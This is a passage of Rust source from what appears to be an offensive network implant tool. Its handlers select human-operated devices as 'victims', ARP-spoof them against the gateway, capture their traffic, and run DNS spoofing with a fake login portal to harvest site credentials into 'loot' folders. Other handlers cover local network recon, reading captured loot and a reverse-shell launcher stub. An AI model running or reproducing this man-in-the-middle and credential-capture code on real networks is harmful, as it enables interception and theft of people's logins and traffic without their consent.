    let mut human_devices: Vec<DeviceInfo> = devices
        .into_iter()
        .filter(is_probably_human_device)
        .collect();
    if human_devices.is_empty() {
        bail!("No likely human-operated devices detected on the network");
    }

    human_devices.sort_by_key(|d| d.ip);

    let cap = max_hosts.max(1);
    let skipped = human_devices.len().saturating_sub(cap);
    human_devices.truncate(cap);

    // Prepare victims and loot paths
    let victims: Vec<HostInfo> = human_devices
        .iter()
        .map(|d| HostInfo { ip: d.ip })
        .collect();
    if victims.is_empty() {
        bail!("No victims selected for poisoning");
    }
    check_cancel(cancel)?;

    let loot_label = format!("{}-{}", site, cidr.replace('/', "_"));
    let pcap_path = build_mitm_pcap_path(root, Some(&loot_label))?;
    let pcap_display = pcap_path.to_string_lossy().to_string();
    let dns_capture_dir = pcap_path
        .parent()
        .map(|p| p.join("dnsspoof").join(&site))
        .unwrap_or_else(|| {
            root.join("loot")
                .join("Ethernet")
                .join("dnsspoof")
                .join(&site)
        });
    fs::create_dir_all(&dns_capture_dir).ok();

    // Clean slate
    let _ = stop_arp_spoof();
    let _ = stop_pcap_capture();
    let _ = stop_portal();
    let _ = stop_dns_spoof();

    let cleanup = || {
        let _ = stop_arp_spoof();
        let _ = stop_pcap_capture();
        let _ = stop_portal();
        let _ = stop_dns_spoof();
    };

    if let Err(err) = check_cancel(cancel) {
        cleanup();
        return Err(err);
    }

    enable_ip_forwarding(true)?;

    let gateway = interface_gateway(&interface_info.name)?
        .or_else(|| default_gateway_ip().ok())
        .ok_or_else(|| anyhow!("could not determine gateway for {}", interface_info.name))?;

    for host in &victims {
        if let Err(err) = check_cancel(cancel) {
            cleanup();
            return Err(err);
        }
        spawn_arpspoof_pair(&interface_info.name, gateway, host)?;
    }

    if let Err(err) = check_cancel(cancel) {
        cleanup();
        return Err(err);
    }
    start_pcap_capture(&interface_info.name, &pcap_path)?;

    // Start DNS spoof + portal
    let portal_cfg = build_portal_config(
        &interface_info.name,
        interface_info.address,
        site_dir.clone(),
        dns_capture_dir.clone(),
    );
    if let Err(err) = check_cancel(cancel) {
        cleanup();
        return Err(err);
    }
    start_portal(portal_cfg)?;
    if let Err(err) = check_cancel(cancel) {
        cleanup();
        return Err(err);
    }
    start_dns_spoof(
        &interface_info.name,
        interface_info.address,
        interface_info.address,
    )?;
    let _ = log_mac_usage(
        root,
        &interface_info.name,
        "ethernet_site_cred",
        Some(&sanitize_label(&loot_label)),
    );

    let victim_ips: Vec<String> = human_devices.iter().map(|d| d.ip.to_string()).collect();
    let _ = write_scoped_log(
        root,
        "Ethernet",
        &cidr,
        "SiteCredCapture",
        "sitecred",
        &[
            format!("Site credential capture on {}", cidr),
            format!("Site: {}", site),
            format!("Interface: {}", interface_info.name),
            format!("Victims: {}", victim_ips.len()),
            format!("PCAP: {}", pcap_path.display()),
            format!("DNS capture dir: {}", dns_capture_dir.display()),
        ],
    );
    let data = json!({
        "interface": interface_info.name,
        "network": cidr,
        "site": site,
        "victim_count": victim_ips.len(),
        "victims": victim_ips,
        "victims_skipped": skipped,
        "gateway": gateway.to_string(),
        "pcap_path": pcap_display,
        "loot_dir": pcap_path.parent().map(|p| p.to_string_lossy().to_string()),
        "dns_capture_dir": dns_capture_dir.to_string_lossy(),
        "max_hosts": cap,
        "dns_spoof": true,
    });

    Ok(("Site cred capture running".to_string(), data))
}

fn handle_mitm_stop() -> Result<HandlerResult> {
    let _ = stop_arp_spoof();
    let _ = stop_pcap_capture();
    enable_ip_forwarding(false)?;

    let data = json!({ "stopped": true });
    Ok(("MITM stopped".to_string(), data))
}

fn handle_dnsspoof_start(root: &Path, args: DnsSpoofStartArgs) -> Result<HandlerResult> {
    let DnsSpoofStartArgs {
        site,
        interface,
        loot_dir,
    } = args;
    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let mut warnings = Vec::new();
        let interface_info = match detect_interface(interface.clone()) {
            Ok(info) => Some(info),
            Err(e) => {
                errors.push(format!("Interface detection failed: {}", e));
                None
            }
        };
        let site_dir = root.join("DNSSpoof").join("sites").join(&site);
        if !site_dir.exists() {
            warnings.push(format!("Site template missing: {}", site_dir.display()));
        }
        let checks = json!({
            "site": site,
            "interface": interface_info
                .as_ref()
                .map(|i| i.name.clone())
                .or_else(|| interface.clone()),
            "loot_dir": loot_dir.as_ref().map(|p| p.to_string_lossy().to_string()),
            "site_dir": site_dir.display().to_string(),
        });
        return preflight_only_response(
            root,
            crate::audit::operations::DNS_SPOOF,
            checks,
            errors,
            warnings,
        );
    }
    let interface_info = detect_interface(interface)?;
    let site_dir = root.join("DNSSpoof").join("sites").join(&site);
    if !site_dir.exists() {
        bail!("Site template not found: {}", site_dir.display());
    }

    let _ = stop_portal();
    let _ = stop_dns_spoof();

    let capture_dir = if let Some(dir) = loot_dir {
        let base = dir.join(&site);
        fs::create_dir_all(&base).ok();
        base
    } else {
        let base = root.join("DNSSpoof").join("captures").join(&site);
        fs::create_dir_all(&base).ok();
        base
    };

    let portal_cfg = build_portal_config(
        &interface_info.name,
        interface_info.address,
        site_dir.clone(),
        capture_dir.clone(),
    );
    start_portal(portal_cfg)?;
    start_dns_spoof(
        &interface_info.name,
        interface_info.address,
        interface_info.address,
    )?;
    let _ = log_mac_usage(
        root,
        &interface_info.name,
        "ethernet_dnsspoof",
        Some(&sanitize_label(&site)),
    );

    let data = json!({
        "interface": interface_info.name,
        "site": site,
        "capture_dir": capture_dir,
    });
    Ok(("DNS spoofing started".to_string(), data))
}

fn handle_dnsspoof_stop() -> Result<HandlerResult> {
    let _ = stop_portal();
    let _ = stop_dns_spoof();
    let data = json!({ "stopped": true });
    Ok(("DNS spoofing stopped".to_string(), data))
}

fn handle_wifi_recon_gateway(
    args: WifiReconGatewayArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    tracing::info!("Discovering gateway information");

    let interface = match args.interface {
        Some(iface) => iface,
        None => select_wifi_interface(None)?,
    };

    enforce_single_interface(&interface)?;
    check_cancel(cancel)?;

    let gateway_info = discover_gateway(&interface)?;

    let data = json!({
        "interface": gateway_info.interface,
        "default_gateway": gateway_info.default_gateway,
        "dns_servers": gateway_info.dns_servers,
        "dhcp_server": gateway_info.dhcp_server,
        "isolation_enforced": true,
    });

    let mut msg = format!("Gateway info for {}:\n", interface);
    if let Some(gw) = gateway_info.default_gateway {
        msg.push_str(&format!("  Gateway: {}\n", gw));
    }
    if !gateway_info.dns_servers.is_empty() {
        msg.push_str(&format!("  DNS: {:?}\n", gateway_info.dns_servers));
    }
    if let Some(dhcp) = gateway_info.dhcp_server {
        msg.push_str(&format!("  DHCP: {}", dhcp));
    }

    Ok((msg, data))
}

fn handle_wifi_recon_arp_scan(
    args: WifiReconArpScanArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    tracing::info!("Scanning local network via ARP on {}", args.interface);

    enforce_single_interface(&args.interface)?;
    check_cancel(cancel)?;

    let devices = if cancel.is_some() {
        arp_scan_cancellable(&args.interface, cancel)?
    } else {
        arp_scan(&args.interface)?
    };

    let devices_json: Vec<Value> = devices
        .iter()
        .map(|d| {
            json!({
                "ip": d.ip.to_string(),
                "mac": d.mac,
                "hostname": d.hostname,
                "vendor": d.vendor,
            })
        })
        .collect();

    let data = json!({
        "interface": args.interface,
        "devices": devices_json,
        "count": devices.len(),
        "isolation_enforced": true,
    });

    let msg = format!("Found {} device(s) on {}", devices.len(), args.interface);

    Ok((msg, data))
}

fn handle_wifi_recon_service_scan(
    args: WifiReconServiceScanArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    tracing::info!("Scanning network services on {}", args.interface);

    check_cancel(cancel)?;
    let devices = if cancel.is_some() {
        arp_scan_cancellable(&args.interface, cancel)?
    } else {
        arp_scan(&args.interface)?
    };
    let services = if cancel.is_some() {
        scan_network_services_cancellable(&devices, cancel)?
    } else {
        scan_network_services(&devices)?
    };

    let services_json: Vec<Value> = services
        .iter()
        .map(|s| {
            json!({
                "ip": s.ip.to_string(),
                "services": s.services.iter().map(|svc| {
                    json!({
                        "port": svc.port,
                        "service": svc.service,
                        "state": svc.state,
                    })
                }).collect::<Vec<_>>(),
            })
        })
        .collect();

    let data = json!({
        "interface": args.interface,
        "results": services_json,
        "count": services.len(),
    });

    let msg = format!("Found services on {} device(s)", services.len());

    Ok((msg, data))
}

fn handle_wifi_recon_mdns_scan(
    args: WifiReconMdnsScanArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    tracing::info!("Discovering mDNS devices for {} seconds", args.duration);

    check_cancel(cancel)?;
    let devices = if cancel.is_some() {
        discover_mdns_devices_cancellable(args.duration, cancel)?
    } else {
        discover_mdns_devices(args.duration)?
    };

    let devices_json: Vec<Value> = devices
        .iter()
        .map(|d| {
            json!({
                "name": d.name,
                "ip": d.ip.to_string(),
                "services": d.services,
                "txt_records": d.txt_records,
            })
        })
        .collect();

    let data = json!({
        "devices": devices_json,
        "count": devices.len(),
        "duration": args.duration,
    });

    let msg = format!("Found {} mDNS device(s)", devices.len());

    Ok((msg, data))
}

fn handle_wifi_recon_bandwidth(
    args: WifiReconBandwidthArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    tracing::info!(
        "Monitoring bandwidth on {} for {} seconds",
        args.interface,
        args.duration
    );

    check_cancel(cancel)?;
    let before = get_traffic_stats(&args.interface)?;
    cancel_sleep(cancel, Duration::from_secs(args.duration))?;
    let after = get_traffic_stats(&args.interface)?;

    let bandwidth = calculate_bandwidth(&before, &after);

    let rx_mbps = bandwidth.rx_bps / 1_000_000.0;
    let tx_mbps = bandwidth.tx_bps / 1_000_000.0;

    let data = json!({
        "interface": args.interface,
        "duration_secs": args.duration,
        "rx_mbps": rx_mbps,
        "tx_mbps": tx_mbps,
        "rx_bytes": after.rx_bytes.saturating_sub(before.rx_bytes),
        "tx_bytes": after.tx_bytes.saturating_sub(before.tx_bytes),
    });

    let msg = format!("Bandwidth: RX={:.2} Mbps, TX={:.2} Mbps", rx_mbps, tx_mbps);

    Ok((msg, data))
}

fn handle_wifi_recon_dns_capture(
    args: WifiReconDnsCaptureArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    tracing::info!(
        "Capturing DNS queries on {} for {} seconds",
        args.interface,
        args.duration
    );

    check_cancel(cancel)?;
    let results = if cancel.is_some() {
        capture_dns_queries_cancellable(
            &args.interface,
            Duration::from_secs(args.duration),
            cancel,
        )?
    } else {
        capture_dns_queries(&args.interface, Duration::from_secs(args.duration))?
    };
    let mut queries = Vec::new();
    for query in results {
        queries.push(json!({
            "domain": query.domain,
            "type": query.query_type,
            "source": query.source_ip.to_string(),
        }));
    }

    let data = json!({
        "interface": args.interface,
        "duration_secs": args.duration,
        "queries": queries,
        "count": queries.len(),
    });

    let msg = format!("Captured {} DNS queries", queries.len());

    Ok((msg, data))
}

fn handle_loot_list(root: &Path, args: LootListArgs) -> Result<HandlerResult> {
    let dir = loot_directory(root, args.kind);
    let kind_label = loot_kind_label(args.kind);
    let mut entries = Vec::new();

    if dir.exists() {
        for entry in WalkDir::new(&dir).into_iter().filter_map(Result::ok) {
            if !entry.file_type().is_file() {
                continue;
            }
            let path = entry.into_path();
            let metadata = path.metadata()?;
            let modified = metadata.modified().unwrap_or(SystemTime::UNIX_EPOCH);
            let modified_ts = modified
                .duration_since(UNIX_EPOCH)
                .unwrap_or(Duration::ZERO)
                .as_secs();
            let file_name = path
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_else(|| "unknown".to_string());
            entries.push((
                modified,
                json!({
                    "name": file_name,
                    "path": path.to_string_lossy(),
                    "size": metadata.len(),
                    "modified": modified_ts,
                }),
            ));
        }
    }

    entries.sort_by(|a, b| b.0.cmp(&a.0));
    let files: Vec<Value> = entries.into_iter().map(|(_, value)| value).collect();

    let data = json!({
        "kind": kind_label,
        "directory": dir.to_string_lossy(),
        "files": files,
    });
    Ok(("Loot listing generated".to_string(), data))
}

fn handle_loot_read(root: &Path, args: LootReadArgs) -> Result<HandlerResult> {
    let LootReadArgs { path, max_lines } = args;
    let resolved = resolve_loot_path(root, &path)?;
    let contents =
        fs::read_to_string(&resolved).with_context(|| format!("reading {}", resolved.display()))?;
    let mut lines = Vec::new();
    let mut truncated = false;
    for (idx, line) in contents.lines().enumerate() {
        if idx >= max_lines {
            truncated = true;
            break;
        }
        lines.push(line.to_string());
    }

    let data = json!({
        "path": resolved.to_string_lossy(),
        "line_count": lines.len(),
        "truncated": truncated,
        "lines": lines,
    });

    Ok(("Loot file read".to_string(), data))
}

fn handle_process_kill(args: ProcessKillArgs) -> Result<HandlerResult> {
    if args.names.is_empty() {
        bail!("At least one --name argument is required");
    }

    let mut killed = Vec::new();
    let mut not_found = Vec::new();

    for name in args.names {
        match kill_process(&name)? {
            KillResult::Terminated => killed.push(name),
            KillResult::NotFound => not_found.push(name),
        }
    }

    let message = if killed.is_empty() {
        "No matching processes were running".to_string()
    } else if not_found.is_empty() {
        "Processes terminated".to_string()
    } else {
        "Some processes terminated".to_string()
    };

    let data = json!({
        "killed": killed,
        "not_found": not_found,
    });

    Ok((message, data))
}

fn handle_process_status(args: ProcessStatusArgs) -> Result<HandlerResult> {
    if args.names.is_empty() {
        bail!("At least one --name argument is required");
    }

    let mut running = Vec::new();
    let mut not_running = Vec::new();

    for name in args.names {
        let is_running = process_running_exact(&name)?;
        if is_running {
            running.push(name);
        } else {
            not_running.push(name);
        }
    }

    let message = if running.is_empty() {
        "No specified processes are running".to_string()
    } else if not_running.is_empty() {
        "All specified processes are running".to_string()
    } else {
        "Some specified processes are running".to_string()
    };

    let data = json!({
        "running": running,
        "not_running": not_running,
    });

    Ok((message, data))
}

fn handle_status_summary() -> Result<HandlerResult> {
    let mitm_running = pcap_capture_running() || arp_spoof_running();
    let dnsspoof_running = dns_spoof_running();

    let status_text = compose_status_text(mitm_running, dnsspoof_running);

    let data = json!({
        "mitm_running": mitm_running,
        "dnsspoof_running": dnsspoof_running,
        "status_text": status_text,
    });

    Ok(("Status collected".to_string(), data))
}

fn handle_network_status() -> Result<HandlerResult> {
    let summaries = list_interface_summaries()?;
    let default_route = read_default_route().unwrap_or(None);
    let dns_servers = read_dns_servers().unwrap_or_default();
    let now = SystemTime::now();

    let mut interfaces = Vec::new();
    for summary in summaries {
        let carrier = fs::read_to_string(format!("/sys/class/net/{}/carrier", summary.name))
            .ok()
            .and_then(|v| v.trim().parse::<u8>().ok())
            .map(|v| v == 1);
        let wifi_link = if summary.kind == "wireless" {
            Some(read_wifi_link_info(&summary.name))
        } else {
            None
        };
        let wpa_state = wifi_link.as_ref().map(|link| {
            if link.connected {
                "Connected"
            } else {
                "Disconnected"
            }
            .to_string()
        });

        let link_ready = match summary.kind.as_str() {
            "wired" => carrier.unwrap_or(false),
            "wireless" => wifi_link
                .as_ref()
                .map(|link| link.connected)
                .unwrap_or(false),
            _ => false,
        };

        let gateway = cached_gateway(&summary.name)
            .or_else(|| interface_gateway(&summary.name).ok().flatten());
        let lease_age_secs = lease_record(&summary.name)
            .and_then(|lease| now.duration_since(lease.acquired_at).ok())
            .map(|duration| duration.as_secs());

        let dhcp_last = last_dhcp_outcome(&summary.name).map(|outcome| {
            let age_secs = now
                .duration_since(outcome.recorded_at)
                .ok()
                .map(|duration| duration.as_secs());
            let mut map = Map::new();
            map.insert("success".into(), Value::Bool(outcome.success));
            if let Some(transport) = outcome.transport {
                map.insert("transport".into(), Value::String(transport));
            }
            if let Some(error) = outcome.error {
                map.insert("error".into(), Value::String(error));
            }
            if let Some(address) = outcome.address {
                map.insert("address".into(), Value::String(address.to_string()));
            }
            if let Some(gateway) = outcome.gateway {
                map.insert("gateway".into(), Value::String(gateway.to_string()));
            }
            if let Some(age) = age_secs {
                map.insert("age_secs".into(), Value::Number(age.into()));
            }
            Value::Object(map)
        });

        let mut iface_map = Map::new();
        iface_map.insert("name".into(), Value::String(summary.name));
        iface_map.insert("kind".into(), Value::String(summary.kind));
        iface_map.insert("oper_state".into(), Value::String(summary.oper_state));
        iface_map.insert("link_ready".into(), Value::Bool(link_ready));
        if let Some(carrier) = carrier {
            iface_map.insert("carrier".into(), Value::Bool(carrier));
        }
        if let Some(state) = wpa_state {
            iface_map.insert("wpa_state".into(), Value::String(state));
        }
        if let Some(ip) = summary.ip {
            iface_map.insert("ip".into(), Value::String(ip));
        }
        if let Some(gateway) = gateway {
            iface_map.insert("gateway".into(), Value::String(gateway.to_string()));
        }
        if let Some(age) = lease_age_secs {
            iface_map.insert("lease_age_secs".into(), Value::Number(age.into()));
        }
        if let Some(dhcp_last) = dhcp_last {
            iface_map.insert("dhcp_last".into(), dhcp_last);
        }

        interfaces.push(Value::Object(iface_map));
    }

    let mut data = Map::new();
    data.insert(
        "active_uplink".into(),
        active_uplink().map(Value::String).unwrap_or(Value::Null),
    );
    let preferred = preferred_interface().ok();
    data.insert(
        "preferred_interface".into(),
        preferred.map(Value::String).unwrap_or(Value::Null),
    );
    if let Some(route) = default_route {
        let mut route_map = Map::new();
        if let Some(interface) = route.interface {
            route_map.insert("interface".into(), Value::String(interface));
        }
        if let Some(gateway) = route.gateway {
            route_map.insert("gateway".into(), Value::String(gateway.to_string()));
        }
        if let Some(metric) = route.metric {
            route_map.insert("metric".into(), Value::Number(metric.into()));
        }
        data.insert("default_route".into(), Value::Object(route_map));
    } else {
        data.insert("default_route".into(), Value::Null);
    }
    data.insert(
        "dns_servers".into(),
        Value::Array(dns_servers.into_iter().map(Value::String).collect()),
    );
    data.insert("interfaces".into(), Value::Array(interfaces));

    Ok(("Network health collected".to_string(), Value::Object(data)))
}

fn handle_reverse_launch(root: &Path, args: ReverseLaunchArgs) -> Result<HandlerResult> {
    let ReverseLaunchArgs {
        target,
        port,
        shell,
        interface,
    } = args;
    let mut errors = Vec::new();
    let warnings = Vec::new();
    if target.parse::<Ipv4Addr>().is_err() {
        errors.push("Target must be an IPv4 address".to_string());
    }
    if port == 0 {
        errors.push("Port must be greater than 0".to_string());
    }
    let interface_info = match detect_interface(interface.clone()) {
        Ok(info) => Some(info),
        Err(e) => {
            errors.push(format!("Interface detection failed: {}", e));
            None
        }
    };
    let checks = json!({
        "target": target,
        "port": port,
        "shell": shell,
        "interface": interface_info
            .as_ref()
            .map(|i| i.name.clone())
            .or(interface),
    });
    preflight_only_response(
        root,
        crate::audit::operations::REVERSE_SHELL,
        checks,
        errors,
        warnings,
    )
}

fn handle_wifi_list() -> Result<HandlerResult> {
    let mut interfaces = list_interface_summaries()?;
    interfaces.sort_by(|a, b| a.name.cmp(&b.name));
    let data = json!({ "interfaces": interfaces });
    Ok(("Interface list generated".to_string(), data))
}

fn handle_wifi_status(root: &Path, args: WifiStatusArgs) -> Result<HandlerResult> {
    tracing::info!("Collecting WiFi status information");

    let interface_name = args.interface.clone();
    let info = if let Some(name) = interface_name.clone() {
        tracing::info!("Getting status for specified interface: {name}");
        match detect_interface(Some(name.clone())) {
            Ok(i) => i,
            Err(e) => {
                tracing::error!("Failed to detect interface {name}: {e}");
                bail!("Failed to get interface info for {name}: {e}");
            }
        }
    } else {
        tracing::info!("Auto-detecting default interface");
        match detect_interface(None) {
            Ok(i) => {
                tracing::info!("Detected default interface: {}", i.name);
                i
            }
            Err(e) => {
                tracing::error!("Failed to detect default interface: {e}");
                bail!("Failed to detect default interface: {e}");
            }
        }
    };

    let stats = read_interface_stats(&info.name).ok();
    let gateway = if let Some(name) = interface_name.clone() {
        interface_gateway(&name)
            .ok()
            .flatten()
            .or_else(|| default_gateway_ip().ok())
    } else {
        interface_gateway(&info.name)
            .ok()
            .flatten()
            .or_else(|| default_gateway_ip().ok())
    };

    let preferred = read_interface_preference(root, "system_preferred")
        .ok()
        .flatten();

    let link = read_wifi_link_info(&info.name);

    // Determine if this is the active interface
    let default_route = read_default_route().ok().flatten();
    let is_active = default_route
        .as_ref()
        .and_then(|r| r.interface.as_ref())
        .map(|iface| iface == &info.name)
        .unwrap_or(false);

    tracing::info!(
        "Interface {} status: active={}, connected={}",
        info.name,
        is_active,
        link.connected
    );

    let data = json!({
        "interface": info.name,
        "address": info.address,
        "cidr": info.network_cidr(),
        "stats": stats,
        "gateway": gateway,
        "preferred": preferred,
        "connected": link.connected,
        "ssid": link.ssid,
        "signal_dbm": link.signal_dbm,
        "tx_bitrate": link.tx_bitrate,
        "is_active": is_active,
        "default_route_interface": default_route.and_then(|r| r.interface),
    });
    Ok(("Interface status collected".to_string(), data))
}

fn handle_wifi_best(root: &Path, args: WifiBestArgs) -> Result<HandlerResult> {
    let interface =
        select_best_interface(root, args.prefer_wifi)?.unwrap_or_else(|| "eth0".to_string());
    let data = json!({ "interface": interface });
    Ok(("Best interface selected".to_string(), data))
}

fn handle_wifi_switch(root: &Path, args: WifiSwitchArgs) -> Result<HandlerResult> {
    let interface = args.interface;
    write_interface_preference(root, "system_preferred", &interface)?;
    let selected_uplink = select_active_uplink().ok();
    let data = json!({
        "interface": interface,
        "selected_uplink": selected_uplink,
        "isolation_enforced": true,
    });
    Ok(("Interface preference saved".to_string(), data))
}

fn ensure_route_health_check() -> Result<()> {
    // netlink availability
    if crate::netlink_helpers::netlink_list_interfaces().is_err() {
        bail!("netlink interface query failed (check kernel support and privileges)");
    }

    // root permissions
    #[cfg(target_os = "linux")]
    {
        let euid = unsafe { libc::geteuid() };
        if euid != 0 {
            bail!("Rustyjack must run as root (uid 0) to manage interfaces and routes");
        }
    }

    // rfkill availability - check /dev/rfkill exists
    #[cfg(target_os = "linux")]
    {
        if !std::path::Path::new("/dev/rfkill").exists() {
            bail!("/dev/rfkill not found (rfkill subsystem missing in kernel)");
        }
    }

    // /etc/resolv.conf must be writable by root
    let resolv = std::fs::OpenOptions::new()
        .write(true)
        .append(true)
        .open("/etc/resolv.conf");
    if let Err(e) = resolv {
        if e.kind() == std::io::ErrorKind::PermissionDenied {
            bail!(
                "/etc/resolv.conf is not writable (possible immutable bit or systemd sandbox). \
                 Remove chattr +i or add ReadWritePaths=/etc/resolv.conf in rustyjackd.service."
            );
        } else {
            bail!("Failed to open /etc/resolv.conf for write: {}", e);
        }
    }

    // /sys/class/net must be readable
    fs::read_dir("/sys/class/net").context("reading /sys/class/net")?;

    Ok(())
}

fn handle_wifi_route_status(_root: &Path) -> Result<HandlerResult> {
    let default_route = read_default_route().unwrap_or(None);
    let interfaces = list_interface_summaries()?;
    let dns_servers = read_dns_servers().unwrap_or_default();
    let data = json!({
        "default_route": default_route,
        "interfaces": interfaces,
        "dns_servers": dns_servers,
    });
    Ok(("Routing status collected".to_string(), data))
}

fn interface_has_carrier(interface: &str) -> bool {
    if interface.is_empty() {
        return false;
    }
    let carrier_path = format!("/sys/class/net/{}/carrier", interface);
    match fs::read_to_string(&carrier_path) {
        Ok(val) => val.trim() == "1",
        Err(_) => false,
    }
}

#[cfg(target_os = "linux")]
fn wpa_ready_for_dhcp(interface: &str) -> bool {
    interface_has_carrier(interface)
}

#[cfg(not(target_os = "linux"))]
fn wpa_ready_for_dhcp(_interface: &str) -> bool {
    false
}

fn handle_wifi_route_ensure(root: &Path, args: WifiRouteEnsureArgs) -> Result<HandlerResult> {
    let WifiRouteEnsureArgs { interface } = args;
    ensure_route_health_check()?;

    let mut summaries = list_interface_summaries()?;
    let mut target_interface = interface.clone();
    let mut iface = summaries.iter().find(|s| s.name == interface);

    if iface.is_none() {
        if let Some((stored_iface, mac)) =
            read_interface_preference_with_mac(root, "system_preferred")?
        {
            if let Some(mac) = mac {
                if let Some(found) = find_interface_by_mac(&mac) {
                    target_interface = found;
                    summaries = list_interface_summaries()?;
                    iface = summaries.iter().find(|s| s.name == target_interface);
                    // Update preference to the renamed interface
                    write_interface_preference(root, "system_preferred", &target_interface)?;
                    tracing::info!(
                        "Recovered renamed interface: {} -> {}",
                        stored_iface,
                        target_interface
                    );
                }
            }
        }
    }

    let _iface = iface.ok_or_else(|| anyhow!("interface {} not found", interface))?;

    let mut summaries = list_interface_summaries()?;
    let mut iface_summary = summaries
        .iter()
        .find(|s| s.name == target_interface)
        .cloned()
        .ok_or_else(|| anyhow!("interface {} not found", target_interface))?;

    let mut gateway = cached_gateway(&target_interface).or(interface_gateway(&target_interface)?);
    let needs_dhcp = iface_summary.ip.is_none() || gateway.is_none();

    if needs_dhcp {
        if iface_summary.kind == "wired" {
            #[cfg(target_os = "linux")]
            let _ = netlink_set_interface_up(&target_interface);
            if !interface_has_carrier(&target_interface) {
                tracing::warn!(
                    "[ROUTE] No carrier detected on {}; attempting DHCP anyway",
                    target_interface
                );
            }
            let _ = acquire_dhcp_lease(&target_interface)?;
        } else if iface_summary.kind == "wireless" {
            if wpa_ready_for_dhcp(&target_interface) {
                let _ = acquire_dhcp_lease(&target_interface)?;
            } else {
                tracing::info!(
                    "[ROUTE] Skipping DHCP on {} (wireless not associated yet)",
                    target_interface
                );
            }
        }

        summaries = list_interface_summaries()?;
        if let Some(updated) = summaries
            .iter()
            .find(|s| s.name == target_interface)
            .cloned()
        {
            iface_summary = updated;
        }
        gateway = cached_gateway(&target_interface).or(interface_gateway(&target_interface)?);
    }

    write_interface_preference(root, "system_preferred", &target_interface)?;
    let selected_uplink = select_active_uplink()?;
    let route_set = selected_uplink.is_some();
    let gateway_ip = gateway;
    let ping_success = if route_set {
        ping_host("8.8.8.8", Duration::from_secs(2)).unwrap_or(false)
    } else {
        false
    };

    let data = json!({
        "interface": target_interface,
        "ip": iface_summary.ip,
        "gateway": gateway_ip,
        "selected_uplink": selected_uplink,
        "route_set": route_set,
        "ping_success": ping_success,
        "isolation_enforced": true,
    });
    let msg = if route_set {
        "Uplink selection applied"
    } else {
        "No eligible uplink found"
    };
    Ok((msg.to_string(), data))
}

fn handle_wifi_route_backup(root: &Path) -> Result<HandlerResult> {
    let path = backup_routing_state(root)?;
    let data = json!({ "path": path });
    Ok(("Routing configuration backed up".to_string(), data))
}

fn handle_wifi_route_restore(root: &Path) -> Result<HandlerResult> {
    restore_routing_state(root)?;
    Ok(("Routing configuration restored".to_string(), json!({})))
}

fn handle_wifi_route_metric(args: WifiRouteMetricArgs) -> Result<HandlerResult> {
    set_interface_metric(&args.interface, args.metric)?;
    let data = json!({
        "interface": args.interface,
        "metric": args.metric,
    });
    Ok(("Interface metric updated".to_string(), data))
}

fn handle_system_update(root: &Path, args: SystemUpdateArgs) -> Result<HandlerResult> {
    run_system_update_with_progress(root, args, None, |_, _| {})
}

pub fn run_system_update_with_progress<F>(
    root: &Path,
    args: SystemUpdateArgs,
    cancel: Option<&CancelFlag>,
    mut on_progress: F,
) -> Result<HandlerResult>
where
    F: FnMut(f32, &str),
{
    let _ = (root, args, cancel);
    on_progress(
        0.0,
        "System updates must be applied via the signed updater pipeline",
    );
    bail!("System updates must be applied via the signed updater pipeline");
}

fn handle_randomize_hostname() -> Result<HandlerResult> {
    #[cfg(not(target_os = "linux"))]
    {
        bail!("Hostname randomization supported on Linux targets only");
    }

    #[cfg(target_os = "linux")]
    {
        let new_hostname = randomize_hostname()?;
        let data = json!({ "hostname": new_hostname });
        Ok((format!("Hostname set to {}", new_hostname), data))
    }
}

fn handle_system_configure_host(args: SystemConfigureHostArgs) -> Result<HandlerResult> {
    let outcome = crate::system::setup::configure_host(args.country.as_deref())
        .context("configuring host settings")?;

    let message = if outcome.regdom.fallback_used {
        format!(
            "Configured regulatory domain: {} (fallback)",
            outcome.regdom.country
        )
    } else {
        format!("Configured regulatory domain: {}", outcome.regdom.country)
    };

    let data = json!({
        "country": outcome.regdom.country,
        "source": outcome.regdom.source,
        "fallback_used": outcome.regdom.fallback_used,
        "cfg80211_path": outcome.regdom.cfg80211_path,
        "cmdline_checked": outcome.regdom.cmdline_checked,
        "cmdline_updated": outcome.regdom.cmdline_updated,
        "cmdline_missing": outcome.regdom.cmdline_missing,
        "sysctl_config_path": outcome.sysctl.config_path,
        "sysctl_runtime_applied": outcome.sysctl.runtime_applied,
        "sysctl_runtime_errors": outcome.sysctl.runtime_errors,
    });

    Ok((message, data))
}

fn handle_system_fde_prepare(root: &Path, args: SystemFdePrepareArgs) -> Result<HandlerResult> {
    let mut errors = Vec::new();
    let warnings = Vec::new();
    let device = args.device.trim();
    if device.is_empty() {
        errors.push("Device path is required".to_string());
    }
    let usb_devices = crate::mount::enumerate_usb_block_devices().unwrap_or_default();
    let allowed = usb_devices.iter().any(|dev| {
        dev.devnode.to_string_lossy() == device || format!("/dev/{}", dev.name) == device
    });
    if !allowed {
        errors.push(format!(
            "Device {} is not a detected USB block device",
            device
        ));
    }
    let checks = json!({
        "device": device,
        "usb_devices": usb_devices.iter().map(|d| d.devnode.to_string_lossy().to_string()).collect::<Vec<_>>(),
    });
    preflight_only_response(
        root,
        crate::audit::operations::FDE_PREPARE,
        checks,
        errors,
        warnings,
    )
}

fn handle_system_fde_migrate(root: &Path, args: SystemFdeMigrateArgs) -> Result<HandlerResult> {
    let mut errors = Vec::new();
    let mut warnings = Vec::new();
    let target = args.target.trim();
    let keyfile = args.keyfile.trim();

    if target.is_empty() {
        errors.push("Target device is required".to_string());
    }
    if keyfile.is_empty() {
        errors.push("Keyfile path is required".to_string());
    }
    if !Path::new(target).exists() {
        errors.push(format!("Target device not found: {}", target));
    }
    if !Path::new(keyfile).exists() {
        errors.push(format!("Keyfile not found: {}", keyfile));
    }
    if args.execute {
        warnings.push("Execute=true would perform destructive actions".to_string());
    }

    let checks = json!({
        "target": target,
        "keyfile": keyfile,
        "execute": args.execute,
    });
    preflight_only_response(
        root,
        crate::audit::operations::FDE_MIGRATE,
        checks,
        errors,
        warnings,
    )
}

pub(crate) fn handle_system_reboot() -> Result<HandlerResult> {
    #[cfg(target_os = "linux")]
    {
        system_reboot_cmd(LINUX_REBOOT_CMD_RESTART)?;
        return Ok((
